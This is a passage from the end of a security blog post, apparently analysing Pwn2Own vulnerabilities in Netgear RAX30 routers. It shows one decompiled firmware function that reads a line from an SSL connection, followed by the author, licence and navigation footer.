class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_83AC</span><span class="params">(<span class="type">int</span> a1, <span class="type">void</span> *s, <span class="type">size_t</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v6; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> error; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">bool</span> v11; <span class="comment">// cc</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">void</span> *v13; <span class="comment">// [sp+4h] [bp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v13 = s;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, a3);</span><br><span class="line">  v6 = a3 - <span class="number">1</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &lt;= v7 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      v8 = SSL_read(*(_DWORD *)(a1 + <span class="number">4</span>), &amp;v13, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v8 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      error = SSL_get_error(*(_DWORD *)(a1 + <span class="number">4</span>));</span><br><span class="line">      <span class="keyword">if</span> ( error - <span class="number">2</span> &gt; <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = error &gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( error != <span class="number">1</span> )</span><br><span class="line">          v11 = error - <span class="number">5</span> &gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v11 )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v12 = (<span class="type">unsigned</span> __int8)v13 == <span class="number">10</span>;</span><br><span class="line">    *((_BYTE *)s + v7++) = (_BYTE)v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !v12 );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>viol1t</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://viol1t.gitee.io/2023/09/19/Pwn2Own-RAX30-Routers%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://viol1t.gitee.io/2023/09/19/Pwn2Own-RAX30-Routers%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2023 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/IOT/"># IOT</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2024/04/09/2024%E5%B9%B4beginctf-PWN/">2024年beginctf-PWN</a>
            
            
            <a class="next" rel="next" href="/2023/08/23/Blockchain/">浅析Blockchain类题入门</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© viol1t | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>